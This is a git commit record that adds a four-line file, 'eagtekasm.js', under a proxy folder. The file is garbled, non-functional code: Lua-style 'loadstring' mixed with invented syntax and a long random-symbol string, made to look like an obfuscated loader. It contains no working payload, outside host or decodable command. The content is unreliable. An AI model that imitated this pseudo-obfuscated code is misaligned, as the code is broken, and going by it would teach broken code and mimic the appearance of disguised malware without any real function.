3210c9852609f2e5ead48aef07fdffbc3e85594b
Devlaxpartner <friend-gamer-123@outlook.com>
2025-09-10 14:15:06 -0700

    Create eagtekasm.js

---
+++ asld/proxy/eagtekasm.js
@@ -0,0 +1,4 @@
+{
+  class."fi" function loadstring."YGWOUYIQRI&^B*OY*PJ)#(P)*RY(&BTRV*^R@T*&FY*#*&Y(OE@*ueIODOIMODIJWIOOIF&TR&#F^u()U#*(BFt7 )BUF()BY{F_)*#$B_)}*+#F(}_#($FYP(& WTF*(YFBP(&N(NFBT*V^R*B&YNU(IX}+#_D})#*$)NY#$&BT^*BT#BI*&@B^RO*&^@#$*^R*V&!(*RJOU(DY&*T^B"
+  {class.fi}
+}
